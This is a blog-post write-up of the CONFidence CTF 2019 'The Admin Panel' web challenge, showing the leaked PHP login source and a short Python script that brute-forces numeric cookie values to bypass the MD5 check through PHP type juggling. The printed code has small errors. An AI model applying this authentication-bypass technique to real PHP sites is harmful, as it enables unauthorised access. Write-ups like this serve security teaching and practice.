---
layout: post
title:  "CONFidence CTF 2019 'The Admin Panel' Writeup"
subtitle: 'Walkthrough for The Admin Panel Challenge'
date:   2019-03-16 05:05:00
tags:
- Web, type juggling
---

Right after iCTF, there was Confidence CTF going on by P4! I was kinda late to look into the challenges and there was hardly ~3 hours left. I went with the one which had most solves, **The Admin Panel**.
<br/><br/>

<figure class="foto-legenda">
	<img src="../assets/conf/ChalDesc.png" alt="">
</figure>

<br/>
<br/>
We were greeted with a normal directory listing page where we had two files, `login.php` & `login.php.bak`.<br/><br/>

<figure class="foto-legenda">
	<img src="../assets/conf/welcomescreen.png" alt="">
</figure>

<br/><br/>

I decided to take up as usual, `login.php`, but had the message pop up `Not authenticated.`. <br/>
<br/>
<br/>

<figure class="foto-legenda">
	<img src="../assets/conf/notauth.png" alt="">
</figure>

<br/>
<br/>

Fair enough, I downloaded the `login.php.bak` and we have the source code with us!<br/><br/>

{% highlight php %}

<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($\_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();

{% endhighlight %}
<br/>
<br/>
Diving into the source code step by step, the `Not authenticated.` message comes out as the cookie, `otadmin` is not there. Okay, good enough, I decided to create a cookie named `otadmin`.

After having that moved into the page, I was greeted with the next message which was `COOKIE TAMPERING xD IM A SECURITY EXPERT`. So looking at that comparison, I understood that the cookie must have a key-value paid of `hash` as key and alphanumeric characters as value in it. And the very next line gets `$session_data` as a json decoded object. <br/>

I then decided to create a new cookie `otadmin` with value `{"hash": ""}`.

Well, that threw me the result of the next condition, which we eventually need to bypass. But without knowing what `$cfg_pass` is, it is rather bs. <br/>

As a result, the hint was nothing but <br/>
```
I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
```
<br/>
<br/>

Now we know what the hint is, what the for loop does, the interesting part was the last comparison was vulnerable to a loose comparison or rather [**type juggling**](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf). The loose comparison would rather do something like: _**When comparing a string to a number, PHP will attempt to convert the string to a number then perform a numeric comparison**_.

<br/>
Good enough, makes it more easier not to bruteforce the md5 result and bypassing that is the only thing which is required now. From the hint, we know that the first three are `0` and hence having a value for hash in the range of 999 can do the trick that is required.

<br/>

{% highlight python %}
#Author: gokul
import requests
url = ""                                              #point to the chal location

with requests.Session as session:
    for i in range(999):
        cookies = {'otadmin':'{"hash": '+str(i)+'}'}  #passing on the cookie
        r = session.get(url, cookies = cookies)           
        if 'p4' in r.text:                            #checking for flag which starts with p4, likely to be in display_admin()
            print(r.text)
            break
{% endhighlight %}

Reach me out on [**Twitter**](https://twitter.com/gkgkrishna33) for any questions! Cheers.
